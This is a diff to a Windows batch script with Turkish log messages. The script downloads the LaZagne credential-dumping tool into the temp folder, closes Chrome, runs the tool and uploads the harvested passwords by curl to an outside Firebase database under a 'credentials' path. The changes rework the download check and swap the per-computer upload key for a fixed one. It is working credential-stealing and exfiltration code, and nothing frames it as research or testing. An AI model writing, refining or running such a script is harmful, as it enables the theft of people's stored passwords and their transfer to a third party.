@@ -5,17 +5,15 @@ setlocal enabledelayedexpansion
 set "LAZ_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZ_EXE=%TEMP%\lazagne.exe"
 set "RESULT_DIR=%TEMP%\results"
-set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%"
+set "FIREBASE_BASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
 
 echo ------------------------------------------------------------
 echo [INFO] Script basladi: %DATE% %TIME%
 echo ------------------------------------------------------------
 
 :: Lazagne.exe varsa indirimi
-if exist "%LAZ_EXE%" (
-    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor.
-) else (
-    echo [INFO] Lazagne indiriliyor...
+if not exist "%LAZ_EXE%" (
+    echo [INFO] Lazagne.exe bulunamadi, indiriliyor...
     powershell -Command "Invoke-WebRequest -Uri '%LAZ_URL%' -OutFile '%LAZ_EXE%' -UseBasicParsing"
     if errorlevel 1 (
         echo [ERROR] Lazagne indirilemedi!
@@ -23,6 +21,8 @@ if exist "%LAZ_EXE%" (
         exit /b 1
     )
     echo [OK] Lazagne indirildi.
+) else (
+    echo [INFO] Lazagne.exe zaten mevcut, indirilmiyor.
 )
 
 :: Chrome varsa kapat
@@ -79,6 +79,10 @@ if not defined RESULT_FILE (
     exit /b 1
 )
 echo [OK] Sonuc dosyasi bulundu: %RESULT_DIR%\!RESULT_FILE!
+
+:: Firebase URL'yi hazirla (COMPUTERNAME yerine sabit bir deger kullan)
+set "SAFE_COMPUTERNAME=upload"
+set "FIREBASE_URL=%FIREBASE_BASE_URL%/%SAFE_COMPUTERNAME%"
 
 :: Sonuclarin Firebase'e yuklenmesi (curl ile)
 echo [INFO] Sonuclar Firebase'e yukleniyor...
